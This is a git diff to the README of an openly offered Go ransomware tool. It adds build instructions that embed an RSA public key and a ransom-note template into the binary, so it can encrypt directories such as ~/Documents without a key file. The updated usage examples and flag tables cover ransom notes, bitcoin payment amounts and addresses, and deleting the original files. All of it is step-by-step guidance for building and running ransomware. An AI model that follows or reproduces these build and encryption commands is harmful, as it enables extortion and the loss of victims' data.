@@ -58,6 +58,37 @@ cd ransomware
 go build -o ransomware .
 ```
 
+### Build with an embedded public key
+
+- Default builds behave as before: no key in the binary, so `--publicKey` is required.
+- With `-tags embedpubkey`, `cli/pub.pem` is baked in via `go:embed`, and encrypt can run without `--publicKey`.
+- If both are present, the file path wins.
+
+```bash
+go run . create-keys --path .
+cp pub.pem cli/pub.pem
+go build -tags embedpubkey -o ransomware .
+./ransomware encrypt --path ~/Documents
+```
+
+### Build with an embedded ransom template
+
+- Default builds behave as before: `--ransomTemplatePath` is required when `--addRansom` is enabled.
+- With `-tags embedransom`, `ransom/IMPORTANT.txt` is baked in via `go:embed`, and `--addRansom` can run without `--ransomTemplatePath`.
+- If both are present, the file path wins.
+
+```bash
+go build -tags embedransom -o ransomware .
+./ransomware encrypt --publicKey ./pub.pem --path ~/Documents --addRansom
+```
+
+Combine both tags to bake in the public key and template together:
+
+```bash
+go build -tags embedpubkey,embedransom -o ransomware .
+./ransomware encrypt --path ~/Documents --addRansom
+```
+
 ## How It Works
 
 The tool implements a [**hybrid encryption strategy**](https://www.picussecurity.com/resource/the-most-common-ransomware-ttp-mitre-attck-t1486-data-encrypted-for-impact#:~:text=In%20the%20hybrid%20encryption%20approach,(public%20key)%20encryption%20algorithm.) combining two algorithms:
@@ -121,7 +152,7 @@ Encrypt all files in a directory.
 | Flag | Default | Description |
 |------|---------|-------------|
 | `--path`, `-p` | *required* | Target directory to encrypt |
-| `--publicKey` | *required* | Path to the RSA public key (PEM format) |
+| `--publicKey` | *required unless embedded* | Path to the RSA public key (PEM format); optional when the binary was built with `-tags embedpubkey` |
 | `--workers`, `-w` | `1` | Number of parallel workers (clamped to NumCPU) |
 | `--partial` | `0` | Encrypt only the first N bytes (`0` = full file) |
 | `--report` | | Write a JSON summary report to the given file path |
@@ -132,7 +163,7 @@ Encrypt all files in a directory.
 | `--dryRun` | `false` | Encrypt without deleting originals |
 | `--encSuffix` | `.enc` | Suffix appended to encrypted files |
 | `--addRansom` | `false` | Add a ransom note to every encrypted folder |
-| `--ransomTemplatePath` | | Path to the ransom note template |
+| `--ransomTemplatePath` | *required unless embedded* | Path to the ransom note template; optional when the binary was built with `-tags embedransom` |
 | `--ransomFileName` | `IMPORTANT.txt` | Name of the ransom note file |
 | `--bitcoinCount` | `0` | Amount of bitcoin to request |
 | `--bitcoinAddress` | `<bitcoin address>` | Bitcoin address for payment |
@@ -142,6 +173,9 @@ Encrypt all files in a directory.
 ```bash
 # Basic encryption
 ransomware encrypt --publicKey ./pub.pem --path ~/Documents
+
+# Using an embedded public key (binary built with -tags embedpubkey)
+ransomware encrypt --path ~/Documents
 
 # Only .gif files
 ransomware encrypt --publicKey ./pub.pem --path ~/Desktop --extWhitelist .gif
@@ -154,6 +188,9 @@ ransomware encrypt --publicKey ./pub.pem --path ~/Desktop --report report.json
 
 # Include a ransom note
 ransomware encrypt --publicKey ./pub.pem --path ~/Desktop --addRansom --ransomTemplatePath ./ransom/IMPORTANT.txt
+
+# Ransom note with an embedded template (binary built with -tags embedransom)
+ransomware encrypt --publicKey ./pub.pem --path ~/Desktop --addRansom
 ```
 
 ---
